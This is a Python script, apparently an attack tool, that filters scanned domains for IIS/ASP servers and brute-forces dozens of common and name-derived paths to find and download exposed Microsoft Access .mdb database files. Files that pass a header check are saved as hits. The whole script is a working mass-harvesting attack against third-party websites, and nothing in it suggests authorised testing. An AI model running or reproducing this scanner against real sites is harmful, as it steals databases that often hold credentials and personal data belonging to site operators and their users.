import json, glob, subprocess, os, hashlib

# All IIS/ASP domains
domains = []
for f in sorted(glob.glob("/tmp/scan_results/*.json")):
    d = json.load(open(f))
    if "IIS" in d.get("server","") or "ASP" in d.get("server",""):
        domains.append(d["domain"])

print("Targets: %d" % len(domains))

mdb_paths = [
    "/db.mdb", "/data.mdb", "/database.mdb", "/data/db.mdb",
    "/databackup/db.mdb", "/wwwroot/db.mdb", "/inc/db.mdb",
    "/admin/db.mdb", "/admin/data.mdb", "/manage/db.mdb",
    "/manager/db.mdb", "/sys/db.mdb", "/system/db.mdb",
    "/%23data.mdb", "/%23db.mdb",  # URL-encoded #data.mdb
    "/databases/db.mdb", "/backup/db.mdb",
    "/bak/db.mdb", "/sql/db.mdb",
]

hits = []

for domain in domains:
    sn = domain.split(".")[0]  # short name
    # Add domain-specific paths
    extra = [
        "/%s.mdb" % sn,
        "/data/%s.mdb" % sn,
        "/%s_db.mdb" % sn,
    ]
    all_paths = mdb_paths + extra
    
    for path in all_paths:
        url = "http://%s%s" % (domain, path)
        try:
            r = subprocess.run(
                ["curl", "-sk", "--connect-timeout", "5", "--max-time", "8",
                 "-o", "/tmp/mdb_dl.tmp", "-w", "%%{http_code} %%{size_download}",
                 url], capture_output=True, text=True, timeout=10)
            out = r.stdout.strip()
            code = out.split(" ")[0] if out else "000"
            size = int(out.split(" ")[1]) if " " in out else 0
        except:
            code = "err"
            size = 0
        
        if size > 10000 and code == "200":
            # Check if it is a real MDB (starts with SCF which is Access header)
            try:
                with open("/tmp/mdb_dl.tmp", "rb") as f:
                    header = f.read(16)
                    if header[:4] == b"\x00\x01\x00\x00" or b"Standard Jet DB" in header or header[0] == 0:
                        fname = "/tmp/mdb_%s_%s.mdb" % (domain.replace(".","_"), path.replace("/","_"))
                        os.rename("/tmp/mdb_dl.tmp", fname)
                        print("HIT: %s -> %s (%d bytes)" % (url, fname, size))
                        hits.append((domain, path, size, fname))
            except:
                pass
        elif size > 1000 and size < 10000 and code == "200":
            # Small - could be a lock file or something
            pass

print("\n=== Summary ===")
print("Total domains scanned: %d" % len(domains))
print("MDB hits: %d" % len(hits))
for h in hits:
    print("  %s -> %s (%d bytes)" % (h[1], h[3], h[2]))
